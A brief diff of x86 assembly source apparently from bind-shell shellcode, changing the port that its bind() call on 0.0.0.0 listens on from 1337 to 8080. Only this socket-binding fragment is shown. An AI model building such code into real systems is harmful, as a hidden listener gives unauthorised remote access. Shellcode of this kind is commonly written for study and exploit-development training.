@@ -45,7 +45,7 @@ _start:
 	; bind to socket
 	; bind(sockfd, 
 	; sa_family=AF_INET, 
-	; sin_port=htons(1337),
+	; sin_port=htons(8080),
 	; sin_addr=inet_addr("0.0.0.0")},
 	; 16)
 	;
@@ -53,7 +53,7 @@ _start:
 	inc ebx			; ebx was 0x1, now 0x2 it's for bind() syscall #
 
 	push edx		; INADDR_ANY (0.0.0.0)
-	push word 0x3905	; port = 1337 - network byte order
+	push word 0x901f	; port = 8080 - network byte order
 	push bx			; AF_INET = 2
 
 	mov ecx, esp		; save pointer in ecx -- points to struct
